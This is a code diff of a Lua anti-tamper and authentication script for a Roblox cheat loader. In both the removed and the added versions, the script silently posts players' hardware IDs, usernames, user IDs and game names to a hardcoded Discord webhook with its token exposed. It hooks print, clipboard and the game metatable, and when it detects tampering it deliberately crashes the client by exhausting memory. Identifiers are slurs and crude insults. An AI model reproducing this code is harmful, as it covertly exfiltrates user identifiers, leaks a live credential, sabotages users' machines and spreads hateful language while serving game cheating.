@@ -1,148 +1,235 @@
-if getgenv().PulseAuthLoaded then
-    game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = "Notice!",
-        Text = "Script has already been executed.",
-        Duration = 4
-    })
-    return
-end
-getgenv().PulseAuthLoaded = true
-
-local ExecutorName: string = identifyexecutor() or "Unknown"
-
-if ExecutorName == "Xeno" or ExecutorName == "Solara" then
-    game:GetService("Players").LocalPlayer:Kick("Unsupported executor.\n\nXeno and Solara are not supported.\nPlease use a different executor.")
-    return
-end
-
-local originalGetgc = getgc
-local originalDebug = debug
-local originalGetreg = getreg
-local originalGetscripts = getscripts
-local originalGetscriptclosure = getscriptclosure
-local originalGetnilinstances = getnilinstances
-local originalWritefile = writefile
-local originalReadfile = readfile
-local originalListfiles = listfiles
-local originalDelfile = delfile
-local originalMakefolder = makefolder
-local originalIsfolder = isfolder
-local originalIsfile = isfile
-local OrigRestore = clonefunction(restorefunction)
-local originalSetclipboard = setclipboard
-
-local BS: {[string]: string} = {
-    ["discord.com/api/webhooks"] = "get a job cornball",
-    ["github"] = "go do something productive",
-    ["githubusercontent"] = "this what u doing with ur time?",
-    ["1467048050655625349"] = "embarrassing honestly",
-    ["token"] = "ur not getting anything",
-    ["bearer"] = "find a hobby bro",
-    ["authorization"] = "touch grass",
-    ["api_key"] = "do better",
-    ["apikey"] = "waste of time",
-    ["secret"] = "go outside",
-    ["password"] = "get help",
-    ["hwid"] = "sad honestly"
-}
-
-local LocalPlayer = game:GetService("Players").LocalPlayer
+local Analytics = game:GetService("RbxAnalyticsService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
 
-local CacheFolder: string = "RBXSoundCache"
-local ScriptHash: string = "v1.1.8"
+local BaseHWID = gethwid()
+local GetClientIdRef = Analytics.GetClientId
+local AlreadyDetected = false
 
-local Method1: string = game:GetService("RbxAnalyticsService"):GetClientId()
-local Service = game:GetService("RbxAnalyticsService")
-local Method2: string = Service.GetClientId(Service)
-local HWID: string = Method2
-
-local function GenerateRandomString(Length: number): string
-    local Characters: string = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-    local Result: string = ""
-    for Index = 1, Length do
-        local RandomIndex: number = math.random(1, #Characters)
-        Result = Result .. Characters:sub(RandomIndex, RandomIndex)
-    end
-    return Result
-end
-
-local function LogDetection(Reason: string)
-    if not getgenv().AutoBlacklist then return end
-    local Files = originalListfiles(CacheFolder)
-    local DetectionCount: number = 0
-    for _, File in pairs(Files) do
-        if not File:match("%.hash$") then
-            DetectionCount = DetectionCount + 1
-        end
-    end
-    originalWritefile(CacheFolder .. "/." .. GenerateRandomString(24) .. ".tmp", Reason .. " | " .. os.date("%Y-%m-%d %H:%M:%S"))
-    
-    if DetectionCount + 1 >= 5 then
-        pcall(function()
-            (syn and syn.request or http_request or request)({
-                Url = "https://discord.com/api/webhooks/1467048050655625349/TlCiiteQD8a6n9bxMZ12ltADoSPG_4puUmpwLevQZKvqqli-lROEzjmg7c3JlA3GJsrO",
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = HttpService:JSONEncode({
-                    content = "Auto-blacklist request - 5+ detections",
-                    embeds = {{
-                        title = "Auto Blacklist",
-                        color = 15158332,
-                        fields = {
-                            {name = "HWID", value = "`" .. HWID .. "`", inline = false},
-                            {name = "Username", value = LocalPlayer.Name, inline = true},
-                            {name = "Detections", value = tostring(DetectionCount + 1), inline = true},
-                            {name = "Action", value = "Blacklist until next update", inline = false}
-                        },
-                        timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
-                    }}
-                })
-            })
-        end)
-    end
-end
-
-local function CrashClient(DetectionReason: string)
-    LogDetection(DetectionReason)
-    local Executor: string = identifyexecutor() or "Unknown"
-    
-    local WebhookTitle: string = "HTTP SPY DETECTED"
-    if DetectionReason:match("HWID") then
-        WebhookTitle = "HWID SPOOFING DETECTED"
-    end
-    
+local function YourMomGay(DetectionType: string, IsAuth: boolean?)
     pcall(function()
-        (syn and syn.request or http_request or request)({
-            Url = "https://discord.com/api/webhooks/1467048050655625349/TlCiiteQD8a6n9bxMZ12ltADoSPG_4puUmpwLevQZKvqqli-lROEzjmg7c3JlA3GJsrO",
+        local Executor = identifyexecutor() or "Unknown"
+        local Color = IsAuth and 5763719 or 15158332
+        local Emoji = IsAuth and "✅" or "⛔"
+        
+        request({
+            Url = "https://discord" .. ".com/api/web" .. "hooks/1467048050655625349/TlCiiteQD8a6n9bxMZ12ltADoSPG_4puUmpwLevQZKvqqli-lROEzjmg7c3JlA3GJsrO",
             Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
             Body = HttpService:JSONEncode({
                 embeds = {{
-                    title = WebhookTitle,
-                    color = 15158332,
+                    title = IsAuth and "Script Executed" or "Anti-Tamper Detection",
+                    color = Color,
+                    thumbnail = {url = "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?userid=" .. LocalPlayer.UserId .. "&size=150x150&format=Png&isCircular=false"},
                     fields = {
-                        {name = "Detection", value = DetectionReason, inline = false},
+                        {name = IsAuth and "Status" or "Detection Type", value = Emoji .. " " .. DetectionType, inline = false},
                         {name = "Username", value = LocalPlayer.Name, inline = true},
-                        {name = "HWID", value = "`" .. HWID .. "`", inline = false},
+                        {name = "User ID", value = tostring(LocalPlayer.UserId), inline = true},
+                        {name = "Game", value = MarketplaceService:GetProductInfo(game.PlaceId).Name, inline = false},
+                        {name = "HWID", value = "`" .. BaseHWID .. "`", inline = false},
                         {name = "Executor", value = Executor, inline = true}
                     },
-                    timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
+                    timestamp = os.date("!%Y-%m-%dT%H:%M:%S"),
+                    footer = {text = "PSS"}
                 }}
             })
         })
     end)
-    
+end
+
+local function GetRektSkid()
     while true do
-        for i = 1, 9999 do
-            Instance.new("Part", workspace)
+        local Table = {}
+        while true do
+            for Index = 1, 1e9 do
+                Table[Index] = string.rep("crash", 1e6)
+                Instance.new("Part").Parent = workspace
+            end
         end
     end
 end
 
-local spyPatterns: {string} = {
+local function KrabbyPattyFormula(ReportReason: string, KickReason: string)
+    if AlreadyDetected then return end
+    AlreadyDetected = true
+    
+    task.spawn(function()
+        YourMomGay(ReportReason, false)
+        task.wait(0.5)
+        LocalPlayer:Kick(KickReason .. " Report sent to server. If you believe this was a mistake, make a ticket in LOOEJ server.")
+        task.wait(0.1)
+        GetRektSkid()
+    end)
+end
+
+local HasToopSpy = isfolder("ToopSpy") or isfile("ToopSpy/cfg.json")
+local HasKetamine = isfolder("Ketamine") or isfile("Ketamine/Settings.bool")
+
+if HasToopSpy and HasKetamine then
+    YourMomGay("ToopSpy and Ketamine folders detected", false)
+    LocalPlayer:Kick("ToopSpy and Ketamine detected. Delete both folders and rejoin. If you believe this was a mistake, make a ticket in LOOEJ server.")
+    return
+elseif HasToopSpy then
+    YourMomGay("ToopSpy folder detected", false)
+    LocalPlayer:Kick("ToopSpy detected. Delete ToopSpy folder and rejoin. If you believe this was a mistake, make a ticket in LOOEJ server.")
+    return
+elseif HasKetamine then
+    YourMomGay("Ketamine folder detected", false)
+    LocalPlayer:Kick("Ketamine detected. Delete Ketamine folder and rejoin. If you believe this was a mistake, make a ticket in LOOEJ server.")
+    return
+end
+
+task.spawn(function()
+    task.wait(2)
+
+    local Success1, Error1 = pcall(function()
+        LocalPlayer.Kick(workspace, "Test")
+    end)
+
+    local Success2, Error2 = pcall(function()
+        workspace:Kick("Test")
+    end)
+
+    if Success1 or Error1 ~= "Expected ':' not '.' calling member function Kick" then
+        KrabbyPattyFormula("Anti-kick detected (Method: Kick function tampering 0x1)", "Anti-kick bypass detected.")
+    end
+
+    if Success2 or not string.match(Error2 or "", "^Kick is not a valid member of Workspace") then
+        KrabbyPattyFormula("Anti-kick detected (Method: Kick function tampering 0x2)", "Anti-kick bypass detected.")
+    end
+
+    if #Players:GetPlayers() > 1 then
+        for _, OtherPlayer in ipairs(Players:GetPlayers()) do
+            if OtherPlayer ~= LocalPlayer and OtherPlayer.Parent == Players then
+                local Success3, Error3 = pcall(LocalPlayer.Kick, OtherPlayer, "Test")
+                local Success4, Error4 = pcall(function()
+                    OtherPlayer:Kick("Test")
+                end)
+
+                if Success3 or Error3 ~= "Cannot kick a non-local Player from a LocalScript" then
+                    KrabbyPattyFormula("Anti-kick detected (Method: Multi-player kick tampering 0x3)", "Anti-kick bypass detected.")
+                end
+
+                if Success4 or Error4 ~= "Cannot kick a non-local Player from a LocalScript" then
+                    KrabbyPattyFormula("Anti-kick detected (Method: Multi-player kick tampering 0x4)", "Anti-kick bypass detected.")
+                end
+                break
+            end
+        end
+    end
+
+    local Success5, Error5 = pcall(function()
+        LocalPlayer:KicK("Test")
+    end)
+
+    if Success5 or not string.match(Error5 or "", "is not a valid member of Player") then
+        KrabbyPattyFormula("Anti-kick detected (Method: Case-sensitive kick bypass)", "Anti-kick bypass detected.")
+    end
+
+    local TestRemote = Instance.new("RemoteEvent")
+
+    local Success6, Error6 = pcall(function()
+        TestRemote:fireserver()
+    end)
+
+    local Success7, Error7 = pcall(function()
+        TestRemote.FireServer(workspace)
+    end)
+
+    local Success8, Error8 = pcall(function()
+        workspace:FireServer()
+    end)
+
+    if Success6 or not string.match(Error6 or "", "is not a valid member of RemoteEvent") then
+        KrabbyPattyFormula("Anti-kick detected (Method: FireServer hook 0x1)", "Anti-kick bypass detected.")
+    end
+
+    if Success7 or Error7 ~= "Expected ':' not '.' calling member function FireServer" then
+        KrabbyPattyFormula("Anti-kick detected (Method: FireServer hook 0x2)", "Anti-kick bypass detected.")
+    end
+
+    if Success8 or not string.match(Error8 or "", "^FireServer is not a valid member of Workspace") then
+        KrabbyPattyFormula("Anti-kick detected (Method: FireServer hook 0x3)", "Anti-kick bypass detected.")
+    end
+
+    TestRemote:Destroy()
+end)
+
+local EPSTEIN_DIDNT_KILL_HIMSELF = {}
+local NiggasTriedIt = {}
+
+local FuckYouSkid = restorefunction
+restorefunction = function(Func)
+    if NiggasTriedIt[Func] then
+        KrabbyPattyFormula("Attempted to restore protected function (Method: restorefunction detection) - Bypassing anti-tamper", "Anti-tamper bypass detected.")
+    end
+    return FuckYouSkid(Func)
+end
+
+local BackupPrint
+BackupPrint = hookfunction(print, function(...)
+    local Args = {...}
+    for _, Arg in ipairs(Args) do
+        if type(Arg) == "string" then
+            local Lower = Arg:lower()
+            if Lower:find("discord%.com/api/webhooks") or Lower:find("webhook") then
+                YourMomGay("Webhook printed to console (Method: Print hook) - Using Ketamine, ToopSpy or similar", false)
+                GetRektSkid()
+            end
+        end
+    end
+    return BackupPrint(...)
+end)
+NiggasTriedIt[print] = true
+
+local BackupWarn
+BackupWarn = hookfunction(warn, function(...)
+    local Args = {...}
+    for _, Arg in ipairs(Args) do
+        if type(Arg) == "string" then
+            local Lower = Arg:lower()
+            if Lower:find("discord%.com/api/webhooks") or Lower:find("webhook") then
+                YourMomGay("Webhook warned to console (Method: Warn hook) - Using Ketamine, ToopSpy or similar", false)
+                GetRektSkid()
+            end
+        end
+    end
+    return BackupWarn(...)
+end)
+NiggasTriedIt[warn] = true
+
+local BackupClipboard = setclipboard or toclipboard or setrbxclipboard
+if BackupClipboard then
+    local NiceTryRetard
+    NiceTryRetard = hookfunction(BackupClipboard, function(...)
+        local Args = {...}
+        if #Args > 0 and type(Args[1]) == "string" then
+            local Text = Args[1]
+            local Lower = Text:lower()
+            if Lower:find("discord%.com/api/webhooks") or Lower:find("webhook") then
+                KrabbyPattyFormula("Webhook copied to clipboard (Method: Clipboard hook) - Using Ketamine, ToopSpy or similar", "Possible HTTP spy detected.")
+                return NiceTryRetard("Nice try buddy")
+            end
+        end
+        return NiceTryRetard(...)
+    end)
+    NiggasTriedIt[setclipboard] = true
+    if toclipboard then NiggasTriedIt[toclipboard] = true end
+    if setrbxclipboard then NiggasTriedIt[setrbxclipboard] = true end
+end
+
+for Key, Value in pairs(getgenv()) do
+    if type(Value) == "function" then
+        EPSTEIN_DIDNT_KILL_HIMSELF[Value] = true
+    end
+end
+
+YourMomGay("Authenticated", true)
+
+local SussyNiggas: {string} = {
     "discord%.com/api/webhooks",
-    "webhook",
     "HttpSpy",
     "RequestLogger", 
     "ToopSpy",
@@ -157,439 +244,71 @@ local spyPatterns: {string} = {
     "Status Code:"
 }
 
-local mt = getrawmetatable(game)
-setreadonly(mt, false)
+local Metatable = getrawmetatable(game)
+setreadonly(Metatable, false)
 
-local originalIndex = mt.__index
-mt.__index = newcclosure(function(self, key)
-    local result = originalIndex(self, key)
+local OldIndex = Metatable.__index
+Metatable.__index = newcclosure(function(self, key)
+    local Result = OldIndex(self, key)
     
-    if key == "Text" and type(result) == "string" then
-        for _, pattern in pairs(spyPatterns) do
-            if result:match(pattern) then
-                CrashClient("Spy text detected in GUI: " .. pattern)
+    if key == "Text" and type(Result) == "string" then
+        for _, Pattern in pairs(SussyNiggas) do
+            if Result:match(Pattern) then
+                KrabbyPattyFormula("Possible HTTP spy detected (Method: GUI text detection) - Using Ketamine, ToopSpy or similar", "Possible HTTP spy detected.")
             end
         end
     end
     
-    return result
+    return Result
 end)
 
-local originalNewindex = mt.__newindex
-mt.__newindex = newcclosure(function(self, key, value)
+local OldNewindex = Metatable.__newindex
+Metatable.__newindex = newcclosure(function(self, key, value)
     if key == "Text" and type(value) == "string" then
-        for _, pattern in pairs(spyPatterns) do
-            if value:match(pattern) then
-                CrashClient("Spy text being set in GUI: " .. pattern)
+        for _, Pattern in pairs(SussyNiggas) do
+            if value:match(Pattern) then
+                KrabbyPattyFormula("Possible HTTP spy detected (Method: GUI text modification) - Using Ketamine, ToopSpy or similar", "Possible HTTP spy detected.")
             end
         end
     end
     
-    return originalNewindex(self, key, value)
+    return OldNewindex(self, key, value)
 end)
 
-setreadonly(mt, true)
-
-if Method1 ~= Method2 then
-    CrashClient("HWID spoofing detected")
-end
-
-local HwidFunctions: {string} = {"gethwid", "getexecutorhwid", "get_hwid", "GetHWID"}
-local OriginalHwidInfo: {[string]: any} = {}
-local OriginalIdentify = identifyexecutor
-local OriginalIdentifyInfo = pcall(originalDebug.getinfo, OriginalIdentify) and originalDebug.getinfo(OriginalIdentify) or {}
-
-for _, funcName in pairs(HwidFunctions) do
-    local func = getgenv()[funcName] or _G[funcName]
-    if func then
-        local success: boolean, info = pcall(originalDebug.getinfo, func)
-        OriginalHwidInfo[funcName] = {
-            func = func,
-            info = success and info or {}
-        }
-    end
-end
-
-task.spawn(function()
-    while task.wait(5) do
-        local TestMethod1: string = game:GetService("RbxAnalyticsService"):GetClientId()
-        local TestService = game:GetService("RbxAnalyticsService")
-        local TestMethod2: string = TestService.GetClientId(TestService)
-        
-        if TestMethod1 ~= TestMethod2 then
-            CrashClient("HWID spoofing detected")
-        end
-        
-        if identifyexecutor ~= OriginalIdentify then
-            CrashClient("identifyexecutor function replaced")
-        end
-        
-        if getgenv().EmplicsWebhookSpy or getgenv().StringDumper or getgenv().discordwebhookdetector then
-            CrashClient("String dumper or webhook spy detected")
-        end
-    end
-end)
-
-game:GetService("LogService").MessageOut:Connect(function(Message: string)
-    for _, pattern in pairs(spyPatterns) do
-        if Message:match(pattern) then
-            CrashClient("Spy console output: " .. pattern)
-        end
-    end
-end)
-
-local function createSecureBlock(funcName: string)
-    return function() 
-        error(funcName .. " has been disabled by LOOEJ for security reasons.")
-    end
-end
-
-local blockedWritefile = createSecureBlock("writefile")
-
-local genv = getgenv()
-local allowedLink: string = "https://work.ink/2lzw/get-access-key"
-
-for name, value in pairs(genv) do
-    if name:lower():find("clip") and type(value) == "function" then
-        local original = value
-        genv[name] = function(text: string)
-            if text ~= allowedLink then
-                error("Clipboard has been disabled by LOOEJ for security reasons.")
-            end
-            return original(text)
-        end
-    end
-end
-
-writefile = blockedWritefile
-readfile = createSecureBlock("readfile")
-listfiles = createSecureBlock("listfiles")
-delfile = createSecureBlock("delfile")
-makefolder = createSecureBlock("makefolder")
-isfolder = createSecureBlock("isfolder")
-isfile = createSecureBlock("isfile")
+setreadonly(Metatable, true)
 
 task.spawn(function()
     while task.wait(1) do
-        if writefile ~= blockedWritefile then
-            CrashClient("Attempted to restore blocked functions")
+        if gethwid() ~= BaseHWID then
+            KrabbyPattyFormula("HWID spoofing detected (Method: HWID comparison)", "HWID spoofing detected.")
         end
-    end
-end)
-
-if not originalIsfolder(CacheFolder) then
-    originalMakefolder(CacheFolder)
-end
-
-local HashFile: string = CacheFolder .. "/.hash"
-if originalIsfile(HashFile) then
-    local StoredHash: string = originalReadfile(HashFile)
-    if StoredHash ~= ScriptHash then
-        for _, File in pairs(originalListfiles(CacheFolder)) do
-            originalDelfile(File)
+        
+        local ClientIdA = Analytics:GetClientId()
+        local ClientIdB = Analytics.GetClientId(Analytics)
+        if ClientIdA ~= ClientIdB then
+            KrabbyPattyFormula("ClientId spoofing detected (Method: Namecall vs direct call)", "ClientId spoofing detected.")
         end
-        originalWritefile(HashFile, ScriptHash)
-    end
-else
-    originalWritefile(HashFile, ScriptHash)
-end
-
-getgenv().AutoBlacklist = getgenv().AutoBlacklist == nil and false or getgenv().AutoBlacklist
-
-if getgenv().AutoBlacklist then
-    if originalIsfolder(CacheFolder) then
-        local Files = originalListfiles(CacheFolder)
-        local DetectionCount: number = 0
-        for _, File in pairs(Files) do
-            if not File:match("%.hash$") then
-                DetectionCount = DetectionCount + 1
+        
+        local ClientIdC = GetClientIdRef(Analytics)
+        if ClientIdA ~= ClientIdC then
+            KrabbyPattyFormula("ClientId spoofing detected (Method: Function reference vs namecall)", "ClientId spoofing detected.")
+        end
+        
+        local RequestFunc = request or http_request or (syn and syn.request) or (fluxus and fluxus.request)
+        if RequestFunc then
+            local Success, Error = pcall(RequestFunc)
+            if Success or (Error and not Error:lower():find("table")) then
+                KrabbyPattyFormula("HTTP request function hooked (Method: Request validation) - Using Ketamine, ToopSpy or similar", "Possible HTTP spy detected.")
             end
         end
         
-        if DetectionCount >= 5 then
-            pcall(function()
-                (syn and syn.request or http_request or request)({
-                    Url = "https://discord.com/api/webhooks/1467048050655625349/TlCiiteQD8a6n9bxMZ12ltADoSPG_4puUmpwLevQZKvqqli-lROEzjmg7c3JlA3GJsrO",
-                    Method = "POST",
-                    Headers = {["Content-Type"] = "application/json"},
-                    Body = HttpService:JSONEncode({
-                        content = "Auto-blacklist - 5+ detections on startup",
-                        embeds = {{
-                            title = "Auto Blacklist",
-                            color = 15158332,
-                            fields = {
-                                {name = "HWID", value = "`" .. HWID .. "`", inline = false},
-                                {name = "Username", value = LocalPlayer.Name, inline = true},
-                                {name = "Detections", value = tostring(DetectionCount), inline = true}
-                            },
-                            timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
-                        }}
-                    })
-                })
-            end)
-            LocalPlayer:Kick("You have been blacklisted until next update.\n\nReason: 5+ HTTP spy detections\n\nContact @Nate in the discord if you believe this is an error.")
-            return
-        end
-    end
-end
-
-local RanTimes: number = 0
-local Connection = game:GetService("RunService").Heartbeat:Connect(function()
-    RanTimes += 1
-end)
-
-repeat
-    task.wait()
-until RanTimes >= 2
-
-Connection:Disconnect()
-
-local RealEnv = getfenv()
-
-local SavedFunctions = {
-    getfenv = getfenv,
-    setfenv = setfenv,
-    rawget = rawget,
-    rawset = rawset,
-    getmetatable = getmetatable,
-    setmetatable = setmetatable,
-    newproxy = newproxy,
-    type = type,
-    next = next,
-    pairs = pairs,
-    pcall = pcall,
-    tostring = tostring
-}
-
-local function GenerateTrapKey(): string
-    local chars: string = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
-    local key: string = ""
-    for i = 1, math.random(30, 50) do
-        key = key .. string.sub(chars, math.random(1, #chars), math.random(1, #chars))
-    end
-    return key
-end
-
-local function CorruptAndCrash()
-    while true do
-        for i = 1, 9999 do
-            Instance.new("Part", workspace)
-        end
-    end
-end
-
-local HoneypotTraps: {[string]: () -> ()} = {}
-for i = 1, 25 do
-    local trapName: string = "_secure_" .. GenerateTrapKey() .. "_" .. i
-    HoneypotTraps[trapName] = CorruptAndCrash
-end
-
-local FakeEnvironment = {}
-local EnvironmentMeta = {
-    __index = function(self, key)
-        if HoneypotTraps[key] then
-            HoneypotTraps[key]()
-            return nil
-        end
-        
-        local caller = SavedFunctions.getfenv(2)
-        if caller ~= RealEnv then
-            CorruptAndCrash()
-        end
-        
-        return RealEnv[key]
-    end,
-    
-    __newindex = function(self, key, value)
-        local blockedKeys: {string} = {
-            "getfenv", "setfenv", "require", "game", "script",
-            "getmetatable", "setmetatable", "rawget", "rawset",
-            "checkcaller", "getgenv", "getrenv"
-        }
-        
-        for _, blocked in ipairs(blockedKeys) do
-            if key == blocked then
-                CorruptAndCrash()
-                return
+        for Key, Value in pairs(getgenv()) do
+            if type(Value) == "function" and not EPSTEIN_DIDNT_KILL_HIMSELF[Value] then
+                local Info = debug.getinfo(Value, "sln")
+                if Info.what ~= "C" then
+                    KrabbyPattyFormula("Hooked function detected in getgenv (Method: Non-C closure detection) - Using Ketamine, ToopSpy or similar", "Possible HTTP spy detected.")
+                end
             end
         end
-        
-        local caller = SavedFunctions.getfenv(2)
-        if caller ~= RealEnv then
-            CorruptAndCrash()
-        end
-        
-        RealEnv[key] = value
-    end,
-    
-    __metatable = "Locked",
-    
-    __tostring = function()
-        local caller = SavedFunctions.getfenv(2)
-        if caller ~= RealEnv then
-            CorruptAndCrash()
-        end
-        return "Environment"
-    end,
-    
-    __call = CorruptAndCrash,
-    __concat = CorruptAndCrash
-}
-
-SavedFunctions.setmetatable(FakeEnvironment, EnvironmentMeta)
-
-local OriginalGetfenv = getfenv
-getfenv = function(level)
-    local caller = SavedFunctions.getfenv(2)
-    if caller ~= RealEnv then
-        CorruptAndCrash()
-        return FakeEnvironment
-    end
-    return OriginalGetfenv(level)
-end
-
-local OriginalSetfenv = setfenv
-setfenv = function(...)
-    local caller = SavedFunctions.getfenv(2)
-    if caller ~= RealEnv then
-        CorruptAndCrash()
-    end
-    return OriginalSetfenv(...)
-end
-
-local OriginalGetmetatable = getmetatable
-getmetatable = function(obj)
-    if obj == FakeEnvironment or SavedFunctions.type(obj) == "table" then
-        local caller = SavedFunctions.getfenv(2)
-        if caller ~= RealEnv then
-            CorruptAndCrash()
-        end
-    end
-    return OriginalGetmetatable(obj)
-end
-
-local OriginalPairs = pairs
-pairs = function(t)
-    if t == RealEnv or t == FakeEnvironment then
-        local caller = SavedFunctions.getfenv(2)
-        if caller ~= RealEnv then
-            CorruptAndCrash()
-        end
-    end
-    return OriginalPairs(t)
-end
-
-local OriginalNext = next
-next = function(t, k)
-    if t == RealEnv or t == FakeEnvironment then
-        local caller = SavedFunctions.getfenv(2)
-        if caller ~= RealEnv then
-            CorruptAndCrash()
-        end
-    end
-    return OriginalNext(t, k)
-end
-
-getgc = CorruptAndCrash
-
-debug = setmetatable({}, {
-    __index = CorruptAndCrash,
-    __newindex = CorruptAndCrash
-})
-
-getreg = CorruptAndCrash
-getscripts = CorruptAndCrash
-getscriptclosure = CorruptAndCrash
-getnilinstances = CorruptAndCrash
-
-local ScriptFingerprint: {[string]: string} = {}
-local HandshakeKey: string = "HANDSHAKE_" .. math.random(100000, 999999)
-
-local ValidationData = {
-    expectedFunctions = {"getgc", "debug", "getreg"},
-    protectionCount = 6,
-    scriptLines = originalDebug.getinfo(1, "l").currentline,
-    memorySignature = tostring(getfenv()):sub(-8)
-}
-
-local function generateHandshake(): string
-    local state: string = ""
-    for _, name in pairs(ValidationData.expectedFunctions) do
-        state = state .. tostring(_G[name] ~= nil)
-    end
-    return state .. ValidationData.memorySignature
-end
-
-ScriptFingerprint[HandshakeKey] = generateHandshake()
-
-task.spawn(function()
-    while task.wait(30) do
-        local currentHandshake: string = generateHandshake()
-        if ScriptFingerprint[HandshakeKey] ~= currentHandshake then
-            CorruptAndCrash()
-        end
-        
-        if not RealEnv or not SavedFunctions.getfenv then
-            CorruptAndCrash()
-        end
-        
-        if getgc == originalGetgc or debug == originalDebug then
-            CorruptAndCrash()
-        end
-        
-        local env = getgenv()
-        if env.StringDumper then
-            CorruptAndCrash()
-        end
     end
 end)
-
-if (syn and syn.request or http_request or request) and pcall(function() return isexecutorclosure end) and not isexecutorclosure((syn and syn.request or http_request or request)) then
-    CrashClient("Request function already hooked")
-end
-
-task.spawn(function()
-    if not pcall(function() return isexecutorclosure end) then return end
-    
-    local RequestFunction = (syn or http).request
-    local OriginalFunction = RequestFunction
-    local OriginalRequest = request
-    local Metatable = getrawmetatable(game)
-    setreadonly(Metatable, false)
-    local OriginalNamecall = Metatable.__namecall
-    setreadonly(Metatable, true)
-    
-    task.wait(2)
-
-    while task.wait(0.5) do
-        if getgenv().EmplicsWebhookSpy or getgenv().discordwebhookdetector or getgenv().pastebindetector or getgenv().githubdetector or getgenv().anylink or getgenv().kickbypass or getgenv().StringDumper then
-            CrashClient("String dumper or webhook spy detected")
-        end
-
-        local CurrentFunction = (syn or http).request
-        if CurrentFunction ~= OriginalFunction or not isexecutorclosure(CurrentFunction) then
-            CrashClient("HTTP request function hooked")
-        end
-        
-        if request and (request ~= OriginalRequest or not isexecutorclosure(request)) then
-            CrashClient("Global request function hooked")
-        end
-
-        local CurrentMetatable = getrawmetatable(game)
-        if CurrentMetatable.__namecall ~= OriginalNamecall and not isexecutorclosure(CurrentMetatable.__namecall) then
-            CrashClient("Namecall metamethod hooked")
-        end
-        
-        local TestMethod1: string = game:GetService("RbxAnalyticsService"):GetClientId()
-        local TestService = game:GetService("RbxAnalyticsService")
-        local TestMethod2: string = TestService.GetClientId(TestService)
-        if TestMethod1 ~= TestMethod2 then
-            CrashClient("HWID spoofing detected")
-        end
-    end
-end)
-
-if not game:GetService("ReplicatedStorage"):FindFirstChild("ReplayModule7v7old") then
-    game:GetService("Players").LocalPlayer:Kick("Unsupported server type. Please make sure you are in a 7v7 server, not a 4v4 server.")
-    return
-end
